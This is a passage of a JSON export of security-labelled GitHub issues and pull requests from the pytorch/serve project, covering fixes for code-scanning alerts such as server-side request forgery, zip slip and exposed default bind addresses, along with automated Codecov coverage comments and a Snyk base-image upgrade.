more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-10-05T22:39:05Z",
                        "url": "https://github.com/pytorch/serve/pull/2685#issuecomment-1749750395"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2685",
                    "merged_at": "2023-10-09T22:26:24Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2665",
                "title": "Server-side request forgery",
                "labels": [
                    "security",
                    "internal"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2665,
                "id": 1924977338,
                "state": "closed",
                "project_created_at": "2023-10-03T21:26:42Z",
                "closed_at": "2023-10-11T04:25:10Z",
                "body": "Tracking issue for:\r\n- [ ] https://github.com/pytorch/serve/security/code-scanning/16\r\n- [ ] https://github.com/pytorch/serve/security/code-scanning/15\r\n",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2664",
                "title": "Uncontrolled command line",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2664,
                "id": 1924976794,
                "state": "closed",
                "project_created_at": "2023-10-03T21:26:16Z",
                "closed_at": "2023-10-11T04:25:11Z",
                "body": "Tracking issue for:\r\n- [ ] https://github.com/pytorch/serve/security/code-scanning/41\r\n",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2635",
                "title": "Uncontrolled input fix for ModelManager",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2635,
                "id": 1919766424,
                "state": "closed",
                "project_created_at": "2023-09-29T18:58:15Z",
                "closed_at": "2023-09-30T00:38:55Z",
                "body": "Fixes\r\nhttps://github.com/pytorch/serve/security/code-scanning/36\r\nhttps://github.com/pytorch/serve/security/code-scanning/34",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2635?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2635](https://app.codecov.io/gh/pytorch/serve/pull/2635?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (8ac8305) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **not change** coverage.\n> Report is 3 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 8ac8305 differs from pull request most recent head 4a0eed0. Consider uploading reports for the commit 4a0eed0 to get more accurate results\n\n```diff\n@@           Coverage Diff           @@\n##           master    #2635   +/-   ##\n=======================================\n  Coverage   71.34%   71.34%           \n=======================================\n  Files          85       85           \n  Lines        3905     3905           \n  Branches       58       58           \n=======================================\n  Hits         2786     2786           \n  Misses       1115     1115           \n  Partials        4        4           \n```\n\n\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T21:04:59Z",
                        "url": "https://github.com/pytorch/serve/pull/2635#issuecomment-1741487038"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2635",
                    "merged_at": "2023-09-30T00:38:55Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2634",
                "title": "fix zip slip",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2634,
                "id": 1919742519,
                "state": "closed",
                "project_created_at": "2023-09-29T18:35:54Z",
                "closed_at": "2023-09-30T00:06:04Z",
                "body": "Fixes\r\nhttps://github.com/pytorch/serve/security/code-scanning/14\r\nhttps://github.com/pytorch/serve/security/code-scanning/2",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2634?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2634](https://app.codecov.io/gh/pytorch/serve/pull/2634?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (b76e40d) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> Report is 3 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head b76e40d differs from pull request most recent head f206a65. Consider uploading reports for the commit f206a65 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2634      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2634/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T18:52:55Z",
                        "url": "https://github.com/pytorch/serve/pull/2634#issuecomment-1741346632"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2634",
                    "merged_at": "2023-09-30T00:06:04Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2633",
                "title": "wip Add url validation in s3 utils",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2633,
                "id": 1919723001,
                "state": "closed",
                "project_created_at": "2023-09-29T18:18:49Z",
                "closed_at": "2023-10-06T03:42:44Z",
                "body": "Solves\r\nhttps://github.com/pytorch/serve/security/code-scanning/16\r\nhttps://github.com/pytorch/serve/security/code-scanning/15\r\n\r\nNot sure what's the right way to change the failing tests now that an IllegalArgumentException will be the default\r\n\r\nEDIT: Ok I'm gonna move on to something else, this PR is a bit annoying to merge since it will make breaking changes to the HTTP status to a lot of requests, will look at other stuff when i have free time",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2633",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2632",
                "title": "Use process build for GPU command",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2632,
                "id": 1919683250,
                "state": "closed",
                "project_created_at": "2023-09-29T17:45:20Z",
                "closed_at": "2023-09-30T00:19:52Z",
                "body": "Solves https://github.com/pytorch/serve/security/code-scanning/4",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2632?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2632](https://app.codecov.io/gh/pytorch/serve/pull/2632?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (4ffdd87) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> Report is 3 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 4ffdd87 differs from pull request most recent head 722b337. Consider uploading reports for the commit 722b337 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2632      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2632/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T18:38:35Z",
                        "url": "https://github.com/pytorch/serve/pull/2632#issuecomment-1741331805"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2632",
                    "merged_at": "2023-09-30T00:19:52Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2631",
                "title": "Default Hostname verifier in Test",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2631,
                "id": 1919667058,
                "state": "closed",
                "project_created_at": "2023-09-29T17:31:12Z",
                "closed_at": "2023-09-29T18:33:07Z",
                "body": "Solves https://github.com/pytorch/serve/security/code-scanning/10",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2631?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2631](https://app.codecov.io/gh/pytorch/serve/pull/2631?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (795dac0) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> Report is 2 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 795dac0 differs from pull request most recent head d7bd0a1. Consider uploading reports for the commit d7bd0a1 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2631      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2631/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T17:54:27Z",
                        "url": "https://github.com/pytorch/serve/pull/2631#issuecomment-1741284264"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2631",
                    "merged_at": "2023-09-29T18:33:07Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2630",
                "title": "Enable Netty HTTP header validation",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2630,
                "id": 1919638113,
                "state": "closed",
                "project_created_at": "2023-09-29T17:07:12Z",
                "closed_at": "2023-09-30T00:22:43Z",
                "body": "Solves\r\nhttps://github.com/pytorch/serve/security/code-scanning/5\r\nhttps://github.com/pytorch/serve/security/code-scanning/6\r\nhttps://github.com/pytorch/serve/security/code-scanning/8\r\nhttps://github.com/pytorch/serve/security/code-scanning/9",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2630?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2630](https://app.codecov.io/gh/pytorch/serve/pull/2630?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (728afb1) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> Report is 1 commits behind head on master.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head 728afb1 differs from pull request most recent head 6f83d44. Consider uploading reports for the commit 6f83d44 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2630      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2630/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T17:22:54Z",
                        "url": "https://github.com/pytorch/serve/pull/2630#issuecomment-1741249202"
                    },
                    {
                        "body": "I'm not sure if there is a history reason of setting false at beginning. I suggest making it configurable (default: true) to avoid breaking some cx prod.",
                        "user": "lxning",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2023-09-30T19:06:30Z",
                        "url": "https://github.com/pytorch/serve/pull/2630#issuecomment-1741838558"
                    },
                    {
                        "body": "Would be nice to have sanity checks in CI for what sagemaker might do but regardless I opened this issue to follow up on later https://github.com/pytorch/serve/issues/2639 - would be great if someone wants to pick this up",
                        "user": "msaroufim",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-09-30T19:20:51Z",
                        "url": "https://github.com/pytorch/serve/pull/2630#issuecomment-1741841434"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2630",
                    "merged_at": "2023-09-30T00:22:43Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2629",
                "title": "Use Sha-256 in ziputils",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2629,
                "id": 1919585288,
                "state": "closed",
                "project_created_at": "2023-09-29T16:31:54Z",
                "closed_at": "2023-09-29T17:46:42Z",
                "body": "Solves https://github.com/pytorch/serve/security/code-scanning/11",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2629?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2629](https://app.codecov.io/gh/pytorch/serve/pull/2629?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (c9b8c05) into [master](https://app.codecov.io/gh/pytorch/serve/commit/d8a11464b098c17207d96a35d89cb83b412a0433?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (d8a1146) will **decrease** coverage by `0.11%`.\n> The diff coverage is `n/a`.\n\n> :exclamation: Current head c9b8c05 differs from pull request most recent head a540cd9. Consider uploading reports for the commit a540cd9 to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2629      +/-   ##\n==========================================\n- Coverage   71.34%   71.24%   -0.11%     \n==========================================\n  Files          85       85              \n  Lines        3905     3905              \n  Branches       58       58              \n==========================================\n- Hits         2786     2782       -4     \n- Misses       1115     1119       +4     \n  Partials        4        4              \n```\n\n\n[see 2 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2629/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-29T16:48:19Z",
                        "url": "https://github.com/pytorch/serve/pull/2629#issuecomment-1741201764"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2629",
                    "merged_at": "2023-09-29T17:46:42Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2624",
                "title": "Update default address from 0.0.0.0 to 127.0.0.1 in documentation and examples",
                "labels": [
                    "security"
                ],
                "user": "namannandan",
                "issue_author_association": "COLLABORATOR",
                "number": 2624,
                "id": 1916380312,
                "state": "closed",
                "project_created_at": "2023-09-27T21:46:13Z",
                "closed_at": "2023-10-02T17:12:53Z",
                "body": "Fixes #2610 ",
                "comments": [
                    {
                        "body": "## [Codecov](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) Report\n> Merging [#2624](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (5e3c1b9) into [master](https://app.codecov.io/gh/pytorch/serve/commit/8bd76ee5234801c7c925f9429168fb0ec3735a26?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) (8bd76ee) will **increase** coverage by `1.89%`.\n> Report is 118 commits behind head on master.\n> The diff coverage is `73.47%`.\n\n> :exclamation: Current head 5e3c1b9 differs from pull request most recent head c5d0cef. Consider uploading reports for the commit c5d0cef to get more accurate results\n\n```diff\n@@            Coverage Diff             @@\n##           master    #2624      +/-   ##\n==========================================\n+ Coverage   69.44%   71.34%   +1.89%     \n==========================================\n  Files          77       85       +8     \n  Lines        3450     3905     +455     \n  Branches       57       58       +1     \n==========================================\n+ Hits         2396     2786     +390     \n- Misses       1051     1115      +64     \n- Partials        3        4       +1     \n```\n\n\n| [Files](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) | Coverage Δ | |\n|---|---|---|\n| [...l-archiver/model\\_archiver/model\\_packaging\\_utils.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-bW9kZWwtYXJjaGl2ZXIvbW9kZWxfYXJjaGl2ZXIvbW9kZWxfcGFja2FnaW5nX3V0aWxzLnB5) | `92.30% <100.00%> (+32.17%)` | :arrow_up: |\n| [setup.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-c2V0dXAucHk=) | `0.00% <ø> (ø)` | |\n| [ts/arg\\_parser.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvYXJnX3BhcnNlci5weQ==) | `25.80% <ø> (ø)` | |\n| [ts/context.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvY29udGV4dC5weQ==) | `67.53% <ø> (ø)` | |\n| [ts/metrics/caching\\_metric.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbWV0cmljcy9jYWNoaW5nX21ldHJpYy5weQ==) | `89.47% <100.00%> (ø)` | |\n| [ts/metrics/metric\\_abstract.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbWV0cmljcy9tZXRyaWNfYWJzdHJhY3QucHk=) | `92.85% <100.00%> (ø)` | |\n| [ts/metrics/metric\\_cache\\_abstract.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbWV0cmljcy9tZXRyaWNfY2FjaGVfYWJzdHJhY3QucHk=) | `93.18% <100.00%> (+0.41%)` | :arrow_up: |\n| [ts/metrics/metric\\_cache\\_yaml\\_impl.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbWV0cmljcy9tZXRyaWNfY2FjaGVfeWFtbF9pbXBsLnB5) | `93.24% <100.00%> (ø)` | |\n| [ts/model\\_loader.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvbW9kZWxfbG9hZGVyLnB5) | `88.31% <ø> (ø)` | |\n| [...sts/metrics\\_yaml\\_testing/metric\\_cache\\_unit\\_test.py](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch#diff-dHMvdGVzdHMvdW5pdF90ZXN0cy9tZXRyaWNzX3lhbWxfdGVzdGluZy9tZXRyaWNfY2FjaGVfdW5pdF90ZXN0LnB5) | `99.68% <100.00%> (+0.02%)` | :arrow_up: |\n| ... and [20 more](https://app.codecov.io/gh/pytorch/serve/pull/2624?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch) | |\n\n... and [3 files with indirect coverage changes](https://app.codecov.io/gh/pytorch/serve/pull/2624/indirect-changes?src=pr&el=tree-more&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n\n:mega: We’re building smart automated test selection to slash your CI/CD build times. [Learn more](https://about.codecov.io/iterative-testing/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=pytorch)\n",
                        "user": "codecov[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-09-27T22:04:44Z",
                        "url": "https://github.com/pytorch/serve/pull/2624#issuecomment-1738138510"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/pytorch/serve/pulls/2624",
                    "merged_at": "2023-10-02T17:12:53Z"
                }
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2612",
                "title": "token based management url",
                "labels": [
                    "documentation",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2612,
                "id": 1908226696,
                "state": "closed",
                "project_created_at": "2023-09-22T05:52:43Z",
                "closed_at": "2024-03-06T20:10:33Z",
                "body": "### 🚀 The feature\n\n- enable/disable token generation.\r\n- if enabled\r\n\r\n1. when model server starts, it generates a token to console.\r\n2. each management request requires the token and verifies it.\n\n### Motivation, pitch\n\nimplement management authentication \n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [
                    {
                        "body": "Token authorization plugin added https://github.com/pytorch/serve/pull/2888",
                        "user": "udaij12",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2024-03-06T20:10:33Z",
                        "url": "https://github.com/pytorch/serve/issues/2612#issuecomment-1981699726"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2611",
                "title": "docker port ",
                "labels": [
                    "documentation",
                    "docker",
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2611,
                "id": 1908206476,
                "state": "closed",
                "project_created_at": "2023-09-22T05:29:25Z",
                "closed_at": "2023-10-28T19:45:44Z",
                "body": "### 📚 The doc issue\n\nUpdate the docker instruction for dev: how to prevent exposed port from getting access by outside connection.\n\n### Suggest a potential alternative/fix\n\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2610",
                "title": "default IP address setting",
                "labels": [
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2610,
                "id": 1908175107,
                "state": "closed",
                "project_created_at": "2023-09-22T04:47:44Z",
                "closed_at": "2023-10-03T17:39:18Z",
                "body": "### 🚀 The feature\n\n1. There are multiple places using \"0.0.0.0\" as default address. It should be replaced with localhost.\r\n\r\n- examples\r\n- config.properties\r\n- code\r\n- launcher.gradle\r\n- Dockerfile\r\n\r\n2. Server throws fatal error if \"0.0.0.0\" is set in dev docker.\r\n3. Server throws error if \"0.0.0.0\" is set in prod docker.\n\n### Motivation, pitch\n\nthe management interface API is bound to the 0.0.0.0 address by default, making it accessible to external requests. This exposes a potential security risk to unauthorized access.\n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/issues/2531",
                "title": "warning if TS_ALLOWED_URLS is using default values in config.properites",
                "labels": [
                    "security"
                ],
                "user": "lxning",
                "issue_author_association": "COLLABORATOR",
                "number": 2531,
                "id": 1859908573,
                "state": "closed",
                "project_created_at": "2023-08-21T18:22:00Z",
                "closed_at": "2023-08-22T21:23:58Z",
                "body": "### 🚀 The feature\n\nProvide the warning such as the following if TS_ALLOWED_URLS is as same as the default value.\r\n\"\r\n  log.warning(\"Your torchserve instance is accessible from any url. When you deploy it to production make sure to limit the set of allowed_urls in your config.properties\")\r\n\"\n\n### Motivation, pitch\n\nConsidering prod safety, it is better to notify cx to config \"TS_ALLOWED_URLS\"\n\n### Alternatives\n\n_No response_\n\n### Additional context\n\n_No response_",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/pytorch/serve/pull/2239",
                "title": "[Snyk] Security upgrade ubuntu from rolling to 22.10",
                "labels": [
                    "security"
                ],
                "user": "msaroufim",
                "issue_author_association": "MEMBER",
                "number": 2239,
                "id": 1673691442,
                "state": "closed",
                "project_created_at": "2023-04-18T19:09:57Z",
                "closed_at": "2023-07-21T21:59:13Z",
                "body": "<p>This PR was automatically created by Snyk using the credentials of a real user.</p><br />Keeping your Docker base image up-to-date means you’ll benefit from security fixes in the latest version of your chosen image.\n\n#### Changes included in this PR \n\n\n- docker/Dockerfile\n\nWe recommend upgrading to `ubuntu:22.10`, as this image has only 7 known vulnerabilities. To do this, merge this pull request, then verify your application still works as expected.\n\n\n\nSome of the most important vulnerabilities in your base image include:\n\n| Severity                                                                                                           | Issue                                                                     | Exploit Maturity      |\n| :------:                                                                                                           | :----                                                                     | :---------------      |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | Information Exposure <br/>[SNYK-UBUNTU2210-GNUTLS28-3319585](https://snyk.io/vuln/SNYK-UBUNTU2210-GNUTLS28-3319585)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | Resource Exhaustion <br/>[SNYK-UBUNTU2210-SYSTEMD-3148007](https://snyk.io/vuln/SNYK-UBUNTU2210-SYSTEMD-3148007)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | Resource Exhaustion <br/>[SNYK-UBUNTU2210-SYSTEMD-3148007](https://snyk.io/vuln/SNYK-UBUNTU2210-SYSTEMD-3148007)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | CVE-2022-4415 <br/>[SNYK-UBUNTU2210-SYSTEMD-3180315](https://snyk.io/vuln/SNYK-UBUNTU2210-SYSTEMD-3180315)   | No Known Exploit   |\n| ![medium severity](https://res.cloudinary.com/snyk/image/upload/w_20,h_20/v1561977819/icon/m.png \"medium severity\")   | Out-of-bounds Read <br/>[SNYK-UBUNTU2210-TAR-3261142](https://snyk.io/vuln/SNYK-UBUNTU2210-TAR-3261142)   | No Known Exploit   |\n\n\n\n---\n\n**Note:** _You are seeing this because you or someone else with access to this repository has authorized Snyk to open fix PRs._\n\nFor more information: <img 